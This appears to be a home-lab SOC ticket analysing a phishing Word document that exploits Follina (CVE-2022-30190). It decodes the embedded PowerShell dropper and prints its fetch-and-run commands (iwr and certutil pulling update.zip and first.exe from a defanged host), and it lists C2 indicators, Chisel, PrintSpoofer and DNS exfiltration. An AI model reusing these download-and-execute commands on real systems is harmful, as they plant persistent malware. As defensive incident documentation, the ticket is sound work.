# SOC Ticket — Phishing Analysis

---

## Ticket Information

| Field | Detail |
|---|---|
| Ticket ID | PHI-004 |
| Date Opened | 2026-04-02 |
| Analyst | Christopher Rice |
| Priority | Critical |
| Status | Closed |
| Classification | Confirmed Phishing |
| Source | SOC Alert — Critical severity alert triaged by SOC analyst |

---

## 1. Reporter Information

| Field | Detail |
|---|---|
| Reported By | benimaru (Finance employee — TEMPEST workstation) |
| Department | Finance |
| Reporting Method | SOC alert — suspicious child process spawned from WinWord.exe |
| Did user click any links? | Unknown |
| Did user open any attachments? | Yes — malicious Word document |
| Did user enter credentials? | No — credentials harvested from stored files |

---

## 2. Email Details

| Field | Detail |
|---|---|
| Delivery Method | Phishing email with .doc attachment |
| Recipient Workstation | TEMPEST |
| Recipient Username | benimaru |
| DKIM | Not confirmed |
| SPF | Not confirmed |
| DMARC | Not confirmed |

---

## 3. Email Content Analysis

**Social Engineering Tactic:**
- [x] Invoice lure — financial document targeting finance employee
- [x] Urgency — unpaid/pending invoice theme

**Indicators of Phishing:**
- [x] Word document exploiting zero-day vulnerability (CVE-2022-30190)
- [x] No macro required — exploit triggered on document open
- [x] Encoded PowerShell payload in document metadata

---

## 4. Attachment Analysis

| Field | Detail |
|---|---|
| Filename | free_magicules.doc |
| File Type | Microsoft Word Document (.doc) |
| CVE Exploited | CVE-2022-30190 (Follina — MSDT RCE) |
| WinWord.exe PID | 496 |
| Sandbox Detonation | Malicious — MSDT spawned, encoded PowerShell executed |

**Exploit Behaviour:**
```
WinWord.exe (PID 496) opens free_magicules.doc

CVE-2022-30190 triggers MSDT (Microsoft Support Diagnostic Tool)

MSDT executes encoded PowerShell payload:
JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNh
dGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFy
dCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNo
dGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0
ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGlu
YXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==

Decoded:
$app=[Environment]::GetFolderPath('ApplicationData');
cd "$app\Microsoft\Windows\Start Menu\Programs\Startup";
iwr hxxp://phishteam[.]xyz/02dcf07/update.zip -outfile update.zip;
Expand-Archive .\update.zip -DestinationPath .;
rm update.zip;

Payload dropped to Startup folder:
C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

On next login:
powershell.exe -w hidden -noni certutil -urlcache -split -f
'hxxp://phishteam[.]xyz/02dcf07/first.exe'
C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe
```

**Stage 2 Binary:**
```
first.exe
SHA256: CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8
C2: resolvecyber[.]xyz:80
Language: Nim (identified via User-Agent)
Encoding: Base64
```

---

## 5. URL / Link Analysis

| URL (defanged) | Destination | Category |
|---|---|---|
| `hxxp://phishteam[.]xyz/02dcf07/index.html` | Initial document fetch URL | Malware delivery |
| `hxxp://phishteam[.]xyz/02dcf07/update.zip` | Stage 1 payload archive | Malware delivery |
| `hxxp://phishteam[.]xyz/02dcf07/first.exe` | Stage 2 C2 binary | Malware delivery |
| `hxxp://resolvecyber[.]xyz:80` | C2 server | C2 communication |

---

## 6. Infrastructure IOCs

| Type | Value (defanged) | Notes |
|---|---|---|
| Malicious Domain | phishteam[.]xyz | Payload hosting — resolved to 167[.]71[.]199[.]191 |
| Malicious Domain | resolvecyber[.]xyz | C2 server — port 80 |
| C2 IP | 167[.]71[.]199[.]191 | Primary C2 and SOCKS proxy endpoint |
| File | free_magicules.doc | Initial malicious document |
| File | C:\Users\Public\Downloads\first.exe | Stage 2 C2 implant |
| File SHA256 | CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8 | first.exe |
| C2 Beacon URI | /9ab62b5 | C2 command polling endpoint |
| C2 Parameter | q | Exfiltration POST parameter |

---

## 7. Affected User / Host Assessment

| Field | Detail |
|---|---|
| Hostname | TEMPEST |
| User Account | benimaru |
| Interaction Type | Opened Word document — CVE-2022-30190 triggered on open |
| Endpoint Isolation Required? | Yes |

**Endpoint Investigation:**

| Check | Finding |
|---|---|
| Suspicious processes running? | Yes — MSDT, PowerShell (encoded), first.exe, ch.exe (Chisel), spf.exe (PrintSpoofer) |
| Unusual network connections? | Yes — beacon to resolvecyber[.]xyz:80, SOCKS proxy to 167[.]71[.]199[.]191:8080 |
| Files dropped on disk? | Yes — first.exe, ch.exe, spf.exe, final.exe |
| Persistence mechanisms found? | Yes — Startup folder payload, malicious service TempestUpdate2 |
| Credentials potentially exposed? | Yes — KeePass DB and Sticky Notes data exfiltrated via DNS |

---

## 8. Verdict

- [x] **Confirmed Phishing**

**Justification:**
Document `free_magicules.doc` exploited CVE-2022-30190 (Follina) requiring no user interaction beyond opening the file. The exploit executed an encoded PowerShell payload establishing C2 via `resolvecyber[.]xyz:80`. Subsequent activity included internal reconnaissance, credential theft from KeePass and Sticky Notes, DNS-based data exfiltration, privilege escalation via PrintSpoofer, and persistent access via a malicious Windows service. Classified as Confirmed Phishing — critical severity.

---

## 9. Actions Taken

| Time | Action | Result |
|---|---|---|
| T+00:05 | Quarantined email from all mailboxes | ✅ Complete |
| T+00:08 | Blocked phishteam[.]xyz and resolvecyber[.]xyz at DNS | ✅ Complete |
| T+00:10 | Blocked 167[.]71[.]199[.]191 at firewall | ✅ Complete |
| T+00:12 | Isolated TEMPEST workstation | ✅ Complete |
| T+00:15 | Applied Microsoft patch for CVE-2022-30190 across all endpoints | ✅ Complete |
| T+00:18 | Escalated to IR team — SYSTEM access achieved, data exfiltrated | ✅ Complete |
| T+00:25 | Notified reporter of confirmed phishing and scope | ✅ Complete |

---

## 10. Escalation

| Field | Detail |
|---|---|
| Escalation Required? | Yes — Critical |
| Escalation Reason | SYSTEM access achieved, KeePass DB exfiltrated, credit card data exposed |
| Escalated To | IR Team |
| Linked IR Report | [IR-001 — Tempest Full Attack Chain](https://github.com/Qwortie/soc-home-lab/blob/main/docs/incident-reports/IR-001-tempest-full-chain.md) |

---

## 11. Analyst Notes

```
CVE-2022-30190 (Follina) is a zero-click RCE — the exploit fires on document
open with no macro interaction required. This makes it particularly dangerous
as user education alone (avoid enabling macros) would not prevent execution.
Patching is the primary mitigation; disabling the MSDT URL protocol is the
interim workaround if patching cannot be applied immediately.

Sysmon was essential — the unusual WinWord → MSDT → PowerShell process chain
was only visible due to process creation logging (EID 1).

Data exfiltration via DNS tunnelling (nslookup + hex encoding) would not have
been caught without DNS anomaly detection. Full KeePass database and credit
card number recovered from PCAP by decoding hex DNS query subdomains.

Full attack chain documented in IR-002.
```

---

## 12. Resolution

| Field | Detail |
|---|---|
| Closed By | Christopher Rice |
| Final Classification | Confirmed Phishing |
| User Notified? | Yes |
| Awareness Training Recommended? | Yes — zero-click exploits, importance of patching |
